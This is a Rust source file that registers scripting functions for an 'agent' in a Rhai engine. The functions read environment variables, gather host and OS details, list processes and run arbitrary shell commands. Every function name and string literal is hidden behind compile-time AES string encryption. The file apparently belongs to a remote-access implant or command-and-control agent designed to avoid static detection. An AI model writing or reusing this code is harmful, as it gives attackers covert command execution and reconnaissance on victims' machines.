// src/agent/scripting/system.rs
use rhai::Engine;
use std::time::Duration;
use crate::utils;
use crate::strcrypt_rt;
use strcrypt::aes_str;

pub fn register(engine: &mut Engine) {
    engine.register_fn(&aes_str!("internal_env"), |var: &str| -> String {
        std::env::var(var).unwrap_or_else(|_| aes_str!("Not Found"))
    });

    engine.register_fn(&aes_str!("internal_sysinfo"), || -> String {
        let hostname = sys_info::hostname().unwrap_or_default();
        let os       = sys_info::os_release().unwrap_or_default();
        format!("{}{}{}{}", aes_str!("Host: "), hostname, aes_str!("\nOS: "), os)
    });

    engine.register_fn(&aes_str!("exec_os"), |cmd: &str| -> String {
        let (out, err, _) = utils::execute_shell_command(cmd);
        if !out.is_empty() { out } else { err }
    });

    engine.register_fn(&aes_str!("exec_os_timeout"), |cmd: &str, secs: i64| -> String {
        let dur         = Duration::from_secs(secs.max(1) as u64);
        let (out, err, _) = utils::execute_shell_command_timeout(cmd, dur);
        if !out.is_empty() { out } else { err }
    });

    engine.register_fn(&aes_str!("internal_procs"), || -> String {
        utils::get_process_list()
    });

    engine.register_fn(&aes_str!("internal_sleep"), |ms: i64| {
        std::thread::sleep(Duration::from_millis(ms.max(0) as u64));
    });
}